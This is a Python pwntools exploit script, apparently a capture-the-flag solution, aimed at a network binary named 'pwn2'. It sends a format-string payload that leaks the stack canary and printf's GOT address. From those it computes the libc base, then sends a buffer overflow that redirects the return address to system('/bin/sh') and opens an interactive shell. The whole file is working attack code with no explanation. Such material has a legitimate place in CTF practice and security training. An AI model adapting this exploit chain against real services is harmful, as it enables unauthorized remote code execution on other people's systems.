#! /bin/python

from pwn import *

libc=ELF('libc.so.6')
sh_str_offset = next(libc.search('/bin/sh'))
system_offset = libc.symbols['system']
printf_offset = libc.symbols['printf']

elf=ELF('pwn2')
printf_got_addr = elf.got.get('printf')
print "printf_got_addr:"+hex(printf_got_addr)

payload1=p32(printf_got_addr)+"[%31$8x][%42$s]"

#r=remote('192.168.44.132', 8888)
r=remote('172.13.1.8', 8000)
raw_input('debug')
r.recvuntil('name:')
r.send(payload1+'\n')
r.recvuntil('ctf!')
canary_libc_leak = r.recvuntil('messages:')
print "================================="
print canary_libc_leak.strip()
print "================================="

idx1=canary_libc_leak.strip().find('[', 0)
idx2=canary_libc_leak.strip().find('[', idx1+1)
idx3=canary_libc_leak.strip().find(']', 0)
idx4=canary_libc_leak.strip().find(']', idx3+1)
canary_leak = canary_libc_leak.strip()[idx1+1:idx3]
libc_leak = canary_libc_leak.strip()[idx2+1:idx4]
print "4 idx:" + str(idx1)+" "+str(idx2)+" "+str(idx3)+" "+str(idx4)
print "libc_leak raw str:"+libc_leak[:4]
print "canary_leak raw str:"+canary_leak

canary = int(canary_leak, 16)
libc_printf_got = struct.unpack('<L', libc_leak[:4])[0]

print "canary:"+hex(canary)
print "libc_printf_got:"+hex(libc_printf_got)

libc_base = libc_printf_got - printf_offset
print "system addr:"+ hex(libc_base+system_offset)
print "bin_sh addr:"+ hex(libc_base+sh_str_offset)

payload2=('a'*(0x70-0xc) +           # get_messge buffer
     p32(canary)  +                  # canary
     'a'*(0xc-4)  +                  # between canary and ebp
     'a'*4 +                         # ebp
     p32(libc_base+system_offset) +  # get_message return addr, set system
     'a'*4 +                         # system return address
     p32(libc_base+sh_str_offset))   # bin/sh str

print enhex(payload2)

r.send(payload2+'\n')
r.interactive()
